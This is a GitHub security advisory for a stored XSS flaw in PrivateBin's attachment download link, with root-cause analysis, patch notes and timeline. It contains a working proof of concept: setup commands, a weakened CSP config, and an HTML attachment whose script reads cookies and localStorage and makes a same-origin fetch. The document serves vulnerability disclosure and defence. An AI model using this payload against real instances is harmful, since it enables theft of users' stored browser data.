# [M] PrivateBin has stored Cross-Side-Scripting (XSS) vulnerability in attachment download link via dangerous MIME types with required user-interaction

## Summary
Severity: Medium
Advisory: GHSA-f2xf-7x3g-4272
CVE: CVE-2026-55696
CWE: CWE-79, CWE-80
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-f2xf-7x3g-4272
Type: github-advisory

## Affected
- Packagist: `privatebin/privatebin` — affected >=0 <2.0.5

## Details
### Summary

Stored cross-site scripting (XSS) in PrivateBin's attachment download link. An anonymous attacker can create a paste with a **text/html** attachment that, with certain user interaction, bypasses protections similar to CVE-2022-24833. When a victim opens the "Download attachment" link in a new tab, the attacker's inline JavaScript executes in the PrivateBin instance's origin with full same-origin capability (cookie/localStorage access, same-origin fetch).

This is an incomplete fix of [CVE-2022-24833](https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-cqcc-mm6x-vmvw). The original fix only applies to the inline preview blob (in case of SVG), never to the download link's blob. Thus a **text/html** (or **image/svg**) attachment completely bypasses sanitization, re-enabling the exact attack class on instances that don't enforce the recommended Content-Security-Policy, but with a slightly different attack process.

Instances using the default recommended CSP are protected (the blob inherits **script-src 'self'**, blocking inline scripts). The vulnerability affects instances where CSP is weakened, stripped, or absent, which is exactly the defense-in-depth scenario the CVE-2022-24833 fix was meant to cover.

Requires **fileupload = true** (non-default) and a non-recommended CSP configuration.

### Details

In **js/privatebin.js**, the function **AttachmentViewer.setAttachment** (line 2982) processes decrypted attachment data. Since PrivateBin uses zero-knowledge encryption, the entire decrypted message (including attachment content and MIME type) is attacker-controlled and can't be inspected or sanitized by the server.

**Root cause 1: MIME-gated sanitization (line 3017)**

DOMPurify sanitization only triggers when the MIME type matches **/^image\/.\*svg/i**. Any other active content type (such as **text/html**, **application/xhtml+xml**, **text/xml**) completely bypasses sanitization.

```js
// js/privatebin.js:3017-3023
if (mimeType.match(/^image\/.*svg/i)) {          // only SVG is considered
    const sanitizedData = DOMPurify.sanitize(
        decodedData,
        purifySvgConfig
    );
    blobUrl = getBlobUrl(sanitizedData, mimeType); // reassigns LOCAL variable only
}
```

**Root cause 2: download link always points to unsanitized blob (line 3002)**

The "Download attachment" link's **href** is set to the unsanitized blob URL at line 3002, before the SVG sanitization branch. The SVG branch (line 3022) only reassigns a local variable **blobUrl** that's consumed by the preview at line 3028. It never updates the download link. So even for SVG attachments, the download link carries unsanitized content.

```js
// js/privatebin.js:3001-3002
let blobUrl = getBlobUrl(decodedData, mimeType);   // unsanitized blob
attachmentLink.attr('href', blobUrl);              // download link set HERE (never updated)
```

**Root cause 3: MIME type is fully attacker-controlled**

The MIME type is extracted from the decrypted data URI at line 3211-3217 via **getAttachmentMimeType**, which simply reads the substring between **data:** and **;** in the data URI. Since this value comes from the decrypted (attacker-created) payload, the attacker chooses whatever MIME type they want. The browser then creates a **Blob** with that exact **Content-Type** at line 2963-2967 via **getBlobUrl**.

**Attack flow:**

1. Attacker creates a paste with an attached **.html** file. The client encodes it as **data:text/html;base64,...** and encrypts it.
2. Victim opens the paste URL. **decryptPaste** (line 5387-5397) decrypts the message and calls **setAttachment** with the attacker's data URI.
3. **setAttachment** creates a same-origin **blob:http://instance/...** with **Content-Type: text/html** containing the attacker's HTML+script. This blob is assigned to the "Download attachment" link's **href** without any sanitization.
4. Victim opens that link in a new tab (right-click, middle-click, or social-engineered left-click). The browser renders the blob as a full HTML document in the instance's origin, executing the attacker's inline JavaScript.

**Relation to CVE-2022-24833:**

The [2022 advisory](https://privatebin.info/reports/vulnerability-2022-04-09.html) claimed: *"whether you open the SVG in a new tab or not and whether CSP is present and enabled or not does not matter any more, as the displayed SVG is sanitized."* This doesn't hold because:
- The download link's blob is never sanitized (only the preview blob is).
- The advisory's safety argument for the download link ("opens from file:// protocol") assumes the file is downloaded to disk. Opening the link in a new tab navigates to a same-origin **blob:** URL instead.

### Proof of concept

**Environment:**
- PrivateBin commit **597a6f0d** (version 2.0.4+)
- PHP 8.x with built-in server
- Chromium-based browser (tested in Playwright/Chromium)

**Step 1: Set up a vulnerable instance**

```bash
git clone https://github.com/PrivateBin/PrivateBin.git
cd PrivateBin
git checkout 597a6f0d
mkdir -p data
```

Create **cfg/conf.php** with file upload enabled and a weakened CSP (simulating an instance where the recommended CSP isn't enforced, as documented in the original CVE-2022-24833 advisory).

For example, here is a basic config:
```ini
[main]
fileupload = true
cspheader = "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; img-src * data: blob:; media-src * blob:; object-src * blob:"
httpwarning = false

[expire]
default = "1week"

[expire_options]
5min = 300
10min = 600
1hour = 3600
1day = 86400
1week = 604800
1month = 2592000
1year = 31536000
never = 0

[formatter_options]
plaintext = "Plain Text"
syntaxhighlighting = "Source Code"
markdown = "Markdown"

[traffic]
limit = 0

[purge]
limit = 300
batchsize = 10

[model]
class = "Filesystem"

[model_options]
dir = "data"
```

Start the server:

```bash
php -S 127.0.0.1:8099
```

**Step 2: Prepare the payload file**

Save as **xss-attachment.html**:

```html
<!DOCTYPE html>
<html>
<head><title>benign</title></head>
<body>
<h1>just a harmless document</h1>
<script>
  document.title = 'XSS:' + document.domain;
  document.body.style.background = '#c00';
  document.body.style.color = '#fff';
  document.body.innerHTML = '<h1>XSS EXECUTED<br>origin = ' + location.origin +
			'<br>protocol = ' + location.protocol +
      '<br>cookies = ' + JSON.stringify(document.cookie) +
      '<br>localStorage = ' + JSON.stringify(localStorage) + '</h1>';
  // prove same-origin capability
  fetch(location.origin + '/?jsonld=paste', { credentials: 'include' })
    .then(r => r.text())
    .then(t => document.body.innerHTML += '<pre>same-origin fetch returned ' + t.length + ' bytes</pre>');
</script>
</body>
</html>
```

<img width="2217" height="888" alt="grafik" src="https://github.com/user-attachments/assets/bf918b75-a977-4df5-8d3f-6e2ffe238c85" />

Optionally set some cookies and/or localstorage data in your browser console. (PrivateBin likely already has set at least a `lang` cookie.)

**Step 3: Attacker creates the paste**

1. Browse to **http://127.0.0.1:8099/**
2. Type any text in the document area (e.g., "Quarterly report attached. Open the Download attachment link to view it.")
3. Click **Attach a file** and select **xss-attachment.html**. The browser detects the file type as **text/html**, so the client produces **attachment = ["data:text/html;base64,..."]**.
4. Click **Create**. Copy the resulting paste URL.

**Step 4: Victim opens the paste**

1. Open the paste URL in a browser. The paste decrypts and renders: "Download attachment (xss-attachment.html, ...)" with a **blob:** link.
2. Right-click the "Download attachment" link and select **Open in new tab** (or middle-click).

**Step 5: Observe XSS execution**

The new tab opens at **blob:http://127.0.0.1:8099/...** with:
- Page title: **XSS:127.0.0.1** (set by attacker script)
- Red background with `XSS EXECUTED, origin = http://127.0.0.1:8099, cookies = "", localstorage = ...` 
- A same-origin fetch to the backend that returns real data (proving full origin access)

<img width="2208" height="856" alt="grafik" src="https://github.com/user-attachments/assets/b13678ac-6fba-4cb9-a7b5-ad2f9a12adc0" />

**Negative control (default CSP):**

Change **cspheader** in **cfg/conf.php** back to the recommended default:

```ini
cspheader = "default-src 'none'; base-uri 'self'; form-action 'none'; manifest-src 'self'; connect-src * blob:; script-src 'self' 'wasm-unsafe-eval'; style-src 'self'; font-src 'self'; frame-ancestors 'none'; frame-src blob:; img-src 'self' data: blob:; media-src blob:; object-src blob:; sandbox allow-same-origin allow-scripts allow-forms allow-modals allow-downloads"
```

Restart the server and open the same paste. The blob navigation now inherits **script-src 'self'** from the page CSP, blocking inline script execution. The browser console shows: *"Executing inline script violates the following Content Security Policy directive 'script-src 'self' 'wasm-unsafe-eval''"*. The page title stays "benign" (script didn't run).

### Impact

**Who is impacted:**
Self-hosted PrivateBin instances that have **both**:
1. File upload enabled (**fileupload = true**, default is **false**)
2. A Content-Security-Policy that doesn't restrict inline scripts (the recommended CSP is weakened, stripped by a reverse proxy/CDN, or absent)

The [CVE-2022-24833 advisory](https://privatebin.info/reports/vulnerability-2022-04-09.html) documented that such instances exist in the wild. Instances using PrivateBin's default recommended CSP are **not affected**.

**What can an attacker do:**
- Execute arbitrary JavaScript in the PrivateBin instance's web origin.
- Read **localStorage** and potentially other locally stored data (IndexDB, etc.) for that origin. 
- Issue authenticated same-origin HTTP requests to the PrivateBin backend (which usually does not have any impact, as PrivateBin does not use traditional authentication methods) or any co-hosted application on the same domain.

**What an attacker _cannot_ do:**
- Exploit instances with the default recommended CSP (inline scripts are blocked in the blob).
- Exploit instances that don't have file upload enabled.
- Execute without victim interaction (the victim must open the attachment link in a new tab).
- Cookie access could _not_ be confirmed (see screenshot above), as these seem to be [separated differently](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy#cross-origin_data_storage_access).
- Access to the opener via **window.opener.document** (same origin) could not be confirmed. (The link is just not opened via `window.open` or similar)

That said, PrivateBin currently only stores user preferences (language, template, theme) in cookies or similar, so no authentication tokens or session data. Thus, similar to CVE-2022-24833, the practical risk exists for instances co-hosted with other applications.

## Patches

To fix the problem, we took the following measures:
* Except for a list of safe common mime types used for media (video/audio/PDF etc.) we overwrite the mime-type with `application/octet-stream` for the download link. This causes the browser to always download the file – even if the user triggered a „Open in new tab“ action – with the exception of the mentioned mime-types. This ensures HTML or any other potentially malicious file types (SVG, XML etc.) are never rendered, mitigating any XSS attacks.

## Timeline

* 2026-06-11 – Received report via GitHub Security Advisory by the reporter.
* 2026-06-11 – Report gets reviewed and discussed with the initial reporter.
* 2026-06-13 – Vulnerability gets reproduced and patch is being developed.
* 2026-06-14 – Patch gets reviewed.
* 2026-06-1X – Patch gets merged
* 2026-06-1X – New PrivateBin release is published.
* 2026-06-XX – Vulnerability details published.

## Credits

This vulnerability was reported by Rizky Muhammad, @EvidentObscurity, which we'd like to thank for that.
In general, we'd like to thank everyone reporting issues and potential vulnerabilities to us.

If you think you have found a vulnerability or potential security risk, [we'd kindly ask you to follow our security policy](https://github.com/PrivateBin/PrivateBin/blob/master/SECURITY.md) and report it to us. We then assess the report and will take the actions we deem necessary to address it.

## References
- https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-f2xf-7x3g-4272
- https://github.com/PrivateBin/PrivateBin/commit/e0dd4c025c19a182b6a4c6fb77a8bf81ceff6899
- https://github.com/PrivateBin/PrivateBin
- https://github.com/PrivateBin/PrivateBin/releases/tag/2.0.5
